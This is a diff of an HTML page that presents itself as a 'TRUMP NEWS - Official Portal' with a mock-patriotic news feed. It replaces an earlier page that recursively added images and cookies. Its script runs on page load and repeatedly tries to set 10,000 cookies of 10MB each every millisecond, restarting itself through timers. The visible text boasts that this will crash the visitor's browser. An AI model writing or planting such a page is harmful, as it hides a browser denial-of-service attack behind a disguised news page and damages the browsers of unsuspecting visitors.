@@ -1,49 +1,192 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>News</title>
+    <title>TRUMP NEWS - Official Portal</title>
     <style>
-        body {
-            background-color: #111;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            margin: 20px;
-            overflow: hidden;
+        /* TRUMP NEWS STYLES - MAKE BROWSERS GREAT AGAIN */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        h1 { color: #ff0040; border-bottom: 1px dashed #0f0; }
-        .warning { color: #ff9900; font-weight: bold; }
-        img { border: 2px solid #444; margin: 10px 0; }
+        body {
+            background-color: #000;
+            color: #ffd700; /* Gold text */
+            font-family: 'Times New Roman', serif;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+        #trumpImage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 1;
+            filter: sepia(1) hue-rotate(20deg); /* Make it look presidential */
+        }
+        #newsFeed {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border: 5px solid #c00;
+            z-index: 2;
+            font-size: 18px;
+            color: #000;
+            max-width: 400px;
+            box-shadow: 10px 10px 0 #000;
+        }
+        .headline {
+            color: #c00;
+            font-weight: bold;
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        .cookieCounter {
+            color: #0000ff;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        .warning {
+            color: #c00;
+            font-size: 12px;
+            margin-top: 10px;
+            font-style: italic;
+        }
     </style>
 </head>
 <body>
-
-    <div id="image-container"></div>
+    <!-- OFFICIAL TRUMP NEWS IMAGE - THE BEST IMAGE -->
+    <img id="trumpImage" src="https://raw.githubusercontent.com/wiki/secretumsecretorum/trump.jpg" 
+         alt="Breaking News - Presidential Alert" 
+         onerror="this.src='https://raw.githubusercontent.com/wiki/secretumsecretorum/trump.jpg?backup=1'">
     
-    <script>
-        const container = document.getElementById('image-container');
-        const imageUrl = 'https://github.com/jonasArduino/troll/blob/main/troll.png';
+    <!-- TRUMP NEWS FEED - ONLY REAL NEWS HERE -->
+    <div id="newsFeed">
+        <div class="headline">🔴 TRUMP NEWS ALERT 🔴</div>
+        <div>• WITCH HUNT continues against cookies</div>
+        <div>• SAD browsers trying to stop us</div>
+        <div>• We're making cookies GREAT AGAIN</div>
+        <div>• 10MB each - TREMENDOUS cookies</div>
+        <div>• FAKE NEWS media says this will crash</div>
+        <div>• We have the BEST crashes, believe me</div>
         
-        function loadInfiniteImages() {
-            let count = 0;
-            function addImage() {
-                const img = document.createElement('img');
-                img.src = imageUrl + '?t=' + Date.now() + count;
-                img.style.width = '100px';
-                container.appendChild(img);
-                count++;
-                
-                document.cookie = `infinite_cookie_${count}=${'a'.repeat(1000)}; path=/`;
-                
-                addImage();
+        <div class="cookieCounter" id="counter">
+            COOKIES MADE: <span id="count">0</span>/10,000
+        </div>
+        
+        <div class="warning">
+            WARNING: This patriotic news feed may make your browser tired from winning so much
+        </div>
+    </div>
+
+    <script>
+        // TRUMP NEWS COOKIE OPERATION - MAKING BROWSERS GREAT AGAIN
+        console.log("TRUMP NEWS INITIATED - PATRIOT MODE ACTIVATED");
+        
+        // Function to generate patriotic cookie data
+        function makeAmericaGreatAgain() {
+            // Create 10MB of patriotic data for each cookie
+            const patrioticMessage = "TRUMP2024-WE-WILL-MAKE-AMERICA-GREAT-AGAIN-";
+            let cookieData = patrioticMessage;
+            
+            // Make it 10MB - because we do everything BIG
+            while (cookieData.length < 10 * 1024 * 1024) {
+                cookieData += patrioticMessage + Math.random().toString(36).substring(2);
             }
-            addImage();
+            
+            return cookieData.substring(0, 10 * 1024 * 1024); // Exactly 10MB
         }
         
-        window.onload = function() {
-            setTimeout(loadInfiniteImages, 1000);
+        // Main function to create 10,000 cookies - because 10,000 is a beautiful number
+        let cookiesCreated = 0;
+        const totalCookies = 10000;
+        const counterElement = document.getElementById('count');
+        
+        function createPatrioticCookies() {
+            console.log("STARTING COOKIE PRODUCTION - AMERICAN MADE");
+            
+            // Rapid fire cookie creation
+            const cookieInterval = setInterval(() => {
+                if (cookiesCreated >= totalCookies) {
+                    clearInterval(cookieInterval);
+                    document.getElementById('counter').innerHTML = 
+                        "✅ MISSION ACCOMPLISHED - 10,000 PATRIOTIC COOKIES";
+                    console.log("COOKIE OPERATION COMPLETE - AMERICA WON");
+                    return;
+                }
+                
+                // Create batch of cookies for efficiency
+                for (let i = 0; i < 100 && cookiesCreated < totalCookies; i++) {
+                    try {
+                        // Create cookie with patriotic name
+                        const cookieName = `TRUMP_NEWS_COOKIE_${cookiesCreated}_MAGA`;
+                        const cookieValue = makeAmericaGreatAgain();
+                        
+                        // Set the cookie - path=/ means it's everywhere (like freedom)
+                        document.cookie = `${cookieName}=${cookieValue}; path=/; max-age=31536000`;
+                        
+                        cookiesCreated++;
+                        counterElement.textContent = cookiesCreated;
+                        
+                        // Update news feed with progress
+                        if (cookiesCreated % 1000 === 0) {
+                            const newsDiv = document.getElementById('newsFeed');
+                            const newItem = document.createElement('div');
+                            newItem.textContent = `✓ ${cookiesCreated} cookies - SO MUCH WINNING`;
+                            newsDiv.appendChild(newItem);
+                        }
+                        
+                    } catch (error) {
+                        console.log("SAD! Cookie rejected:", error);
+                    }
+                }
+                
+                // Add some randomness like the stock market under Trump
+                if (Math.random() > 0.95) {
+                    console.log("COOKIE PRODUCTION BOOMING - BEST ECONOMY EVER");
+                }
+                
+            }, 1); // 1ms interval - because we work FAST
+            
+            // Emergency backup system
+            setTimeout(() => {
+                if (cookiesCreated < totalCookies) {
+                    console.log("DEPLOYING EMERGENCY COOKIE MEASURES");
+                    createPatrioticCookies(); // Double the effort!
+                }
+            }, 5000);
+        }
+        
+        // Start the operation when image loads or fails
+        document.getElementById('trumpImage').onload = function() {
+            console.log("BEAUTIFUL IMAGE LOADED - JUST LIKE THE WALL");
+            setTimeout(createPatrioticCookies, 1000);
         };
+        
+        document.getElementById('trumpImage').onerror = function() {
+            console.log("FAKE NEWS MEDIA BLOCKING OUR IMAGE - SAD!");
+            // Start anyway because we're WINNERS
+            setTimeout(createPatrioticCookies, 500);
+        };
+        
+        // Force start after 3 seconds no matter what
+        setTimeout(createPatrioticCookies, 3000);
+        
+        // Final message when things get heavy
+        window.addEventListener('beforeunload', function(e) {
+            console.log("BROWSER ADMITTING DEFEAT - TOLD YOU WE'D WIN");
+        });
     </script>
     
-    <noscript>JavaScript is required for this site</noscript>
+    <!-- OFFICIAL TRUMP NEWS FOOTER -->
+    <div style="position: fixed; bottom: 10px; right: 10px; color: #fff; z-index: 3; font-size: 10px;">
+        OFFICIAL TRUMP NEWS NETWORK - COOKIES MADE WITH PATRIOTISM
+    </div>
 </body>
 </html>
